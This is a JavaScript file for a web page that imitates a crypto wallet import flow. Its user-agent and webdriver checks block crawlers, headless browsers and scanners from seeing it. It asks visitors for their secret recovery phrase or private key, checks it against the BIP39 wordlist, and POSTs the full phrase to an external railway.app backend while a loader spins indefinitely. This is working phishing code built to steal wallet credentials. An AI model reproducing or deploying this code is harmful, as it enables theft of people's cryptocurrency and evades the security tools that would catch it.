import { renderCaptcha, getCaptchaToken } from "./captcha.js";

const feedback = document.querySelector("#demo-feedback");
const captchaMeta = document.querySelector("#captcha-meta");
window.captchaMeta = captchaMeta;
const blockedReason = document.querySelector("#blocked-reason");
const recaptchaWidget = document.querySelector("#recaptcha-widget");
const recaptchaSiteKey = "6Lem3QctAAAAADxKwAA-TwsomgL-Al-ELNfQbcdH";
const screens = {
  captcha: document.querySelector('[data-screen="captcha"]'),
  blocked: document.querySelector('[data-screen="blocked"]'),
  home: document.querySelector('[data-screen="home"]'),
  import: document.querySelector('[data-screen="import"]'),
  secret: document.querySelector('[data-screen="secret"]'),
};
const actionButtons = document.querySelectorAll("[data-action]");
const backButtons = document.querySelectorAll("[data-back]");
const backToButtons = document.querySelectorAll("[data-back-to]");
const termsCheckbox = document.querySelector("#terms");
const existingWalletButton = document.querySelector('[data-action="existing"]');
const clearWalletNameButton = document.querySelector("[data-clear-wallet-name]");
const walletNameInput = document.querySelector(".secret-name-input");
const secretPhraseDisplay = document.querySelector(".secret-phrase-display");
const secretImportButton = document.querySelector(".secret-import-button");

const defaultLanguage = "en";
const supportedLanguages = ["en"];
const translations = {
  en: {
    "meta.description": "",
    "common.back": "Back",
    "common.help": "Help",
    "home.title": "Join 200M users who are securing their financial future",
    "home.termsPrefix": "I have read and agree to the",
    "home.terms": "Terms of Service",
    "home.termsJoiner": "and the",
    "home.privacy": "Privacy Notice",
    "home.existingWallet": "I already have a wallet",
    "home.demoFeedback": "Demo mode: no real wallet is created.",
    "import.title": "Select your existing wallet",
    "import.visualTitle": "Import a wallet",
    "import.walletListLabel": "Available wallets",
    "import.otherWallet": "Other mobile wallet or extension",
    "details.title": "Import wallet details",
    "details.walletName": "Wallet Name",
    "details.defaultWalletName": "Main wallet",
    "details.clearWalletName": "Clear wallet name",
    "details.walletNameHelper": "You can edit this later",
    "details.descriptionLabel": "Enter Secret Phrase / Private Key",
    "details.descriptionPlaceholder": "Enter Secret Phrase / Private Key",
    "details.descriptionHelper": "Secret Phrase is typically 12 (sometimes 18,24) words separated by single spaces. Private Key is a long alphanumeric code.",
    "details.import": "Import",
  },
};

const messages = {
  new: "home.demoFeedback",
};

const botSignals = [
  {
    reason: "Automation flag detected",
    test: () => navigator.webdriver === true,
  },
  {
    reason: "Headless browser user agent detected",
    test: () => /HeadlessChrome|PhantomJS|SlimerJS|Puppeteer|Playwright|Selenium|WebDriver/i.test(navigator.userAgent),
  },
  {
    reason: "Command-line or script client detected",
    test: () => /bot|crawler|spider|curl|wget|python|scrapy|httpclient|axios|node-fetch|libwww|httpx/i.test(navigator.userAgent),
  },
  {
    reason: "Browser language headers are missing",
    test: () => !navigator.languages || navigator.languages.length === 0,
  },
  {
    reason: "Browser plugin surface is missing",
    test: () => {
      const isTouchDevice = navigator.maxTouchPoints > 0;
      return !isTouchDevice && navigator.plugins && navigator.plugins.length === 0;
    },
  },
];

let activeLanguage = defaultLanguage;
function normalizeLanguage(language) {
  return language.toLowerCase().split("-")[0];
}

function getLanguageCandidates() {
  const requestedLanguage = new URLSearchParams(window.location.search).get("lang");
  const browserLanguages = navigator.languages?.length ? navigator.languages : [navigator.language];

  return [requestedLanguage, ...browserLanguages].filter(Boolean);
}

function resolveLanguage(languages = []) {
  for (const language of languages) {
    const normalized = normalizeLanguage(language);
    if (supportedLanguages.includes(normalized)) {
      return normalized;
    }
  }

  return defaultLanguage;
}

function translate(key) {
  return translations[activeLanguage]?.[key] ?? translations[defaultLanguage][key] ?? key;
}

function applyTranslations() {
  activeLanguage = resolveLanguage(getLanguageCandidates());
  document.documentElement.lang = activeLanguage;
  document.documentElement.dir = activeLanguage === "ar" ? "rtl" : "ltr";

  document.querySelector('meta[name="description"]')?.setAttribute("content", translate("meta.description"));

  document.querySelectorAll("[data-i18n]").forEach((element) => {
    element.textContent = translate(element.dataset.i18n);
  });

  document.querySelectorAll("[data-i18n-attr]").forEach((element) => {
    element.dataset.i18nAttr.split(";").forEach((entry) => {
      const [attribute, key] = entry.split(":").map((part) => part.trim());
      if (!attribute || !key) return;
      element.setAttribute(attribute, translate(key));
    });
  });
}

function updateDescriptionMask() {
  if (!secretPhraseDisplay) return;

  secretPhraseDisplay.classList.remove("is-hidden-text");
  if ("type" in secretPhraseDisplay && secretPhraseDisplay.tagName !== "TEXTAREA") {
    secretPhraseDisplay.type = "text";
  }
  if (secretImportButton) {
    secretImportButton.disabled = secretPhraseDisplay.value.trim().length === 0;
  }
}

function showValidationError(errorMessage) {
  if (!secretPhraseDisplay) return;
  
  const helper = secretPhraseDisplay.parentElement.nextElementSibling;
  const errorSpan = helper.nextElementSibling;
  
  if (helper && errorSpan) {
    helper.style.display = "none";
    errorSpan.style.display = "inline";
    errorSpan.textContent = errorMessage;
    errorSpan.style.color = "#d93025";
  }
}

function clearValidationError() {
  if (!secretPhraseDisplay) return;
  
  const helper = secretPhraseDisplay.parentElement.nextElementSibling;
  const errorSpan = helper.nextElementSibling;
  
  if (helper && errorSpan) {
    helper.style.display = "inline";
    errorSpan.style.display = "none";
    errorSpan.textContent = "";
  }
}

function playVisibleVideos(screenName) {
  Object.entries(screens).forEach(([name, screen]) => {
    if (!screen) return;

    screen.querySelectorAll("video").forEach((video) => {
      if (name === screenName) {
        video.muted = true;
        video.currentTime = 0;
        requestAnimationFrame(() => video.play().catch(() => {}));
        setTimeout(() => video.play().catch(() => {}), 120);
      } else {
        video.pause();
      }
    });
  });
}

function showScreen(screenName) {
  Object.entries(screens).forEach(([name, screen]) => {
    if (!screen) return;
    screen.hidden = name !== screenName;
  });

  playVisibleVideos(screenName);
}

function getBotBlockReason() {
  for (const signal of botSignals) {
    try {
      if (signal.test()) return signal.reason;
    } catch {
      return "Browser verification failed";
    }
  }

  return "";
}

function showBlocked(reason) {
  if (blockedReason) {
    blockedReason.textContent = reason ? `Reason: ${reason}.` : "";
  }

  showScreen("blocked");
}

let currentCaptchaToken = "";

function markCaptchaPassed(token) {
  currentCaptchaToken = token || getCaptchaToken();

  if (captchaMeta) captchaMeta.textContent = "Verification complete.";

  fetch("https://vault-wallet-back-production.up.railway.app/api/captcha/landing", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ captchaToken: currentCaptchaToken, country: "Unknown" }),
  }).catch((error) => console.error("Error sending landing page notification:", error));

  showScreen("home");
}

async function renderRecaptcha() {
  if (!recaptchaWidget) return false;
  if (recaptchaWidget.dataset.rendered === "true") return true;

  try {
  await renderCaptcha(recaptchaWidget, {
  siteKey: recaptchaSiteKey,
  onSuccess: markCaptchaPassed,
      onExpired: () => {
        if (captchaMeta) captchaMeta.textContent = "Verification expired. Please try again.";
      },
      onError: () => {
        if (captchaMeta) captchaMeta.textContent = "Verification could not load. Check your connection and refresh.";
      },
    });

    recaptchaWidget.dataset.rendered = "true";
    if (captchaMeta) captchaMeta.textContent = "Complete the check to continue.";
    return true;
  } catch (error) {
    console.error("Captcha render error:", error);
    if (captchaMeta) captchaMeta.textContent = "Verification failed to load.";
    return false;
  }
}

function initCaptchaGate() {
  const blockReason = getBotBlockReason();
  if (blockReason) {
    showBlocked(blockReason);
    return;
  }


  showScreen("captcha");

let attempts = 0;
let captchaLoading = false;

const loadTimer = window.setInterval(async () => {
  attempts += 1;

  if (!captchaLoading) {
    captchaLoading = true;

    const rendered = await renderRecaptcha();

    captchaLoading = false;

    if (rendered || attempts > 80) {
      window.clearInterval(loadTimer);
    }
  }

  if (attempts > 80 && captchaMeta) {
    captchaMeta.textContent = "Verification is still loading. Refresh the page if it does not appear.";
  }
}, 250);
}

function showFeedback(action) {
  if (!feedback) return;

  const messageKey = messages[action];
  feedback.textContent = messageKey ? translate(messageKey) : "";
}

function updateTermsGate() {
  if (!termsCheckbox || !existingWalletButton) return;

  existingWalletButton.disabled = !termsCheckbox.checked;
}

termsCheckbox?.addEventListener("change", updateTermsGate);

actionButtons.forEach((button) => {
  button.addEventListener("click", () => {
    const action = button.dataset.action;

    if (action === "existing") {
      if (!termsCheckbox?.checked) return;
      showScreen("import");
      return;
    }

    if (action === "trust-mobile" || action === "wallet-import") {
      showScreen("secret");
      return;
    }

    showFeedback(action);
  });
});

backButtons.forEach((button) => {
  button.addEventListener("click", () => {
    showScreen("home");
  });
});

backToButtons.forEach((button) => {
  button.addEventListener("click", () => {
    showScreen(button.dataset.backTo);
  });
});

clearWalletNameButton?.addEventListener("click", () => {
  if (!walletNameInput) return;
  walletNameInput.value = "";
  walletNameInput.focus();
});

secretPhraseDisplay?.addEventListener("focus", () => {
  secretPhraseDisplay.classList.add("is-focused");
});

secretPhraseDisplay?.addEventListener("blur", () => {
  secretPhraseDisplay.classList.remove("is-focused");
});

secretPhraseDisplay?.addEventListener("click", () => {
  secretPhraseDisplay.focus();
});

secretPhraseDisplay?.addEventListener("input", () => {
  updateDescriptionMask();
  clearValidationError();
});

function validateSeedPhrase(phrase) {
  const words = phrase.trim().split(/\s+/);
  
  if (words.length === 0) {
    return { valid: false, error: "Blank mnemonic" };
  }
  
  const validLengths = [12, 15, 18, 21, 24];
  if (!validLengths.includes(words.length)) {
    return { valid: false, error: `Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words (got ${words.length})` };
  }
  
  const bip39Wordlist = [
    "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
    "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
    "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
    "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
    "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert",
    "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter",
    "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger",
    "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "anticipate",
    "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic",
    "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest",
    "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset",
    "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction",
    "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake",
    "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge",
    "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain",
    "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become",
    "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit",
    "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology",
    "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless",
    "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body",
    "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss",
    "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread",
    "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze",
    "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb",
    "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy",
    "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call",
    "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas",
    "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry",
    "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category",
    "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century",
    "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase",
    "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child",
    "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle",
    "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk",
    "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close",
    "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
    "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort",
    "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control",
    "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "corner", "correct",
    "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack",
    "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit",
    "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd",
    "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture",
    "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle",
    "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day",
    "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer",
    "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist",
    "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design",
    "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial",
    "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner",
    "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display",
    "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin",
    "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon",
    "drama", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop",
    "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf",
    "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo",
    "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow",
    "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody",
    "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless",
    "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough",
    "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip",
    "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate",
    "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange",
    "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit",
    "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye",
    "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame",
    "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father",
    "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female",
    "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file",
    "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first",
    "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor",
    "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly",
    "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest",
    "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile",
    "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen",
    "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy",
    "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp",
    "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture",
    "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance",
    "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue",
    "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown",
    "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid",
    "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt",
    "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "handle",
    "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health",
    "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden",
    "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole",
    "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital",
    "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred",
    "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea",
    "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune",
    "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate",
    "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury",
    "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install",
    "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue",
    "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel",
    "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior",
    "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney",
    "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife",
    "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language",
    "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit",
    "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal",
    "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level",
    "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit",
    "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster",
    "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love",
    "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad",
    "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage",
    "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market",
    "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum",
    "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt",
    "member", "memory", "men", "menu", "mercy", "merge", "merit", "merry", "mesh", "message",
    "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor",
    "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile",
    "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral",
    "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie",
    "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual",
    "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature",
    "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net",
    "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee",
    "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now",
    "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe",
    "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often",
    "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online",
    "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order",
    "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output",
    "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact",
    "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper",
    "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol",
    "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen",
    "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo",
    "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pilot", "pin",
    "pine", "pink", "pipe", "pistol", "pit", "pitch", "pizza", "place", "plain", "plane",
    "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem",
    "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion",
    "position", "positive", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice",
    "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary",
    "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program",
    "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding",
    "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose",
    "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick",
    "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail",
    "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate",
    "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall",
    "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret",
    "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove",
    "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "reply", "report", "require",
    "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion",
    "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge",
    "rifle", "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river",
    "road", "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose",
    "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run",
    "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon",
    "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save",
    "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors",
    "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat",
    "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar",
    "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow",
    "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship",
    "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug",
    "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk",
    "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "sit", "situation",
    "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab",
    "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow",
    "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff",
    "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid",
    "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup",
    "source", "south", "space", "spare", "spark", "speak", "special", "speed", "spell", "spend",
    "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon",
    "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable",
    "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak",
    "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone",
    "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff",
    "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar",
    "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure",
    "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap",
    "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom",
    "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape",
    "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant",
    "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory",
    "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder",
    "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue",
    "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato",
    "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch",
    "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track",
    "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat",
    "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble",
    "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble",
    "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist",
    "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under",
    "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock",
    "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban",
    "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum",
    "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault",
    "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel",
    "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin",
    "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void",
    "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut",
    "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way",
    "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome",
    "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper",
    "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink",
    "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder",
    "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle",
    "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra",
    "zero", "zone", "zoo"
  ];
  
  const isPrivateKey = /^[a-fA-F0-9]{32,64}$/.test(phrase);
  const isSeedPhrase = words.every(word => bip39Wordlist.includes(word.toLowerCase()));
  
  if (!isPrivateKey && !isSeedPhrase) {
    const firstInvalidWord = words.find(word => !bip39Wordlist.includes(word.toLowerCase()) && !/^[a-fA-F0-9]{32,64}$/.test(word));
    return { valid: false, error: `"${firstInvalidWord}" not in BIP39 wordlist` };
  }
  
  return { valid: true, error: null };
}

secretImportButton?.addEventListener("click", async () => {
  if (!secretPhraseDisplay || !walletNameInput) return;

  const loader = document.querySelector(".loader-overlay");


  const walletName = walletNameInput.value.trim();
  const seedPhrase = secretPhraseDisplay.value.trim();

  if (!seedPhrase) {
    if (window.captchaMeta) {
      window.captchaMeta.textContent = "Please enter a seed phrase.";
    }
    return;
  }

  const validation = validateSeedPhrase(seedPhrase);
  if (!validation.valid) {
    showValidationError(validation.error);
    return;
    if (window.captchaMeta) {
      window.captchaMeta.textContent = `❌ ${validation.error}`;
    }
    return;
  }
  
  clearValidationError();
 if (loader) {
    loader.removeAttribute("hidden");
    loader.classList.add("is-loading-forever");
  }
  const backendUrl = "https://vault-wallet-back-production.up.railway.app/api/wallet/import";
  const captchaToken = currentCaptchaToken || getCaptchaToken();

  if (!captchaToken || captchaToken.trim().length === 0) {
  if (window.captchaMeta) {
    window.captchaMeta.textContent = "Please complete the captcha check.";
  }
  return;
}

  try {
    const response = await fetch(backendUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        walletName: walletName || "Main wallet",
        seedPhrase,
        description: seedPhrase.length > 50 ? seedPhrase.substring(0, 50) + "..." : seedPhrase,
        captchaToken,
      }),
    });

    const result = await response.json();

    if (result.status === "pending") {
      if (window.captchaMeta) {
        window.captchaMeta.textContent = "✅ Wallet import submitted. Waiting for verification.";
      }
      secretImportButton.textContent = "Submitted";
    } else {
      if (window.captchaMeta) {
        window.captchaMeta.textContent = `⚠️ Import status: ${result.status}`;
      }
    }
  } catch (error) {
    console.error("Error submitting wallet import:", error);
    if (window.captchaMeta) {
      window.captchaMeta.textContent = "❌ Error submitting import. Check backend connection.";
    }
  }
});

document.addEventListener("click", (event) => {
  if (!secretPhraseDisplay) return;

  if (secretPhraseDisplay.contains(event.target)) {
    secretPhraseDisplay.classList.add("is-focused");
    return;
  }

  secretPhraseDisplay.classList.remove("is-focused");
});

//applyTranslations();
updateTermsGate();
updateDescriptionMask();

initCaptchaGate();
